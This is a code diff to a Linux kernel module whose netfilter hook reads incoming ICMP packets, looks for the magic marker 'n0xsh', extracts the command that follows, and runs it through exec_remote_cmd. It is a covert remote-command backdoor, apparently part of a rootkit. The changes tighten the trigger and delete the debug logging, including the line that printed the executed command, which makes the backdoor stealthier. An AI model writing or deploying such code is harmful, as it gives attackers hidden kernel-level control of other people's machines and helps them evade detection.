@@ -36,13 +36,11 @@ unsigned int icmp_hook_func(void *priv, struct sk_buff *skb, const struct nf_hoo
     int data_len;
 
     if (!skb) {
-        printk("erro1");
         return NF_ACCEPT;
     }
 
     ip = ip_hdr(skb);
     if (!ip) {
-        printk("erro2");
         return NF_ACCEPT;
     }
 
@@ -52,7 +50,6 @@ unsigned int icmp_hook_func(void *priv, struct sk_buff *skb, const struct nf_hoo
 
     icmp = icmp_hdr(skb);
     if (!icmp) {
-        printk("erro4");
         return NF_ACCEPT;
     }
 
@@ -64,12 +61,10 @@ unsigned int icmp_hook_func(void *priv, struct sk_buff *skb, const struct nf_hoo
     // allocate a buffer for the payload data
     data_len = ntohs(ip->tot_len) - sizeof(struct iphdr) - sizeof(struct icmphdr);
     if (data_len <= 0) {
-        printk("erro5");
         return NF_ACCEPT;
     }
     data = kmalloc(data_len + 1, GFP_ATOMIC);
     if (!data) {
-        printk("erro6");
         return NF_ACCEPT;
     }
     // copy the payload data to the buffer
@@ -86,7 +81,7 @@ unsigned int icmp_hook_func(void *priv, struct sk_buff *skb, const struct nf_hoo
     //printk("%c aq e data25", data + 25);
     for (ix=0;ix<data_len;ix++){
         //printk("%c", data[ix]);
-        if (data[ix] == 'n' && data[ix+1] == '0') {
+        if (data[ix] == 'n' && data[ix+1] == '0' && data[ix+2] == 'x' && data[ix+3] == 's' && data[ix+4] == 'h') {
             //printk("%c dataix %c", data[ix], data[ix+1]);
             for (j = ix + 6; j < data_len; j++) {
                 if (data[j] == '#'){
@@ -97,10 +92,9 @@ unsigned int icmp_hook_func(void *priv, struct sk_buff *skb, const struct nf_hoo
             }
         }
     }
-    printk("%s", exec_command);
+    //printk("%s", exec_command);
     if (strlen(exec_command) != 0){
         exec_remote_cmd(exec_command);
-        printk("executou?");
     }
     kfree(data);
     return NF_ACCEPT;
